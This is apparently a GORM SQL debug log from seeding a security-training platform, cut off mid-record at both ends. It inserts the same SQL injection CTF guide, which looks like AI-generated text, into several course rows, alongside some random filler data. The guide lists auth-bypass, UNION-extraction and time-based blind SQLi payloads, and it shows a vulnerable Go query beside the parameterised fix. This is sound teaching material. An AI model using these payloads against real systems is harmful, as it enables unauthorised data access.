## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,47) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.427ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[109.693ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.391','2025-06-09 14:07:54.391',NULL,'storage bucket misconfigurations','Exploiting public S3/Blob Storage',10,3) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.566ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.655ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 48 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[41.755ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.502','2025-06-09 14:07:54.502',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,48) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.445ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[14.810ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.543','2025-06-09 14:07:54.543',NULL,'serverless function abuse','Exploiting AWS Lambda/Azure Functions',240,4) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.573ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.548ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 49 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[42.432ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.56','2025-06-09 14:07:54.56',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,49) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.730ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[9.837ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.603','2025-06-09 14:07:54.603',NULL,'cloud logging bypass','Evading CloudTrail/Azure Monitor',250,4) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.408ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.447ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 50 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[11.076ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.611','2025-06-09 14:07:54.611',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,50) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.429ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[38.335ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.622','2025-06-09 14:07:54.622',NULL,'cyber security and bmaom','bHCgwLwMEPoNXAGaCPKrVYQTMhddJGwLEryYHbVCnvswgmwuZpYILFQwHWjbIBiMseUMLGWqvliubSoBHEQmrThsyzjIMowqDiku',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.546ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.514ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 51 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.671ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.661','2025-06-09 14:07:54.661',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,51) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.494ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.691ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.669','2025-06-09 14:07:54.669',NULL,'cyber security and xwzki','xVDqkIUPLxsiOIRglpjAxjMrXHuIXndZsxifDIQaHydcKkAnibxAcviQpUSZGtHSUMVXDtAxtlOSyrvYRnQcjhEzVVXvdUaNJtML',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.569ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.897ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 52 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[17.928ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.68','2025-06-09 14:07:54.68',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
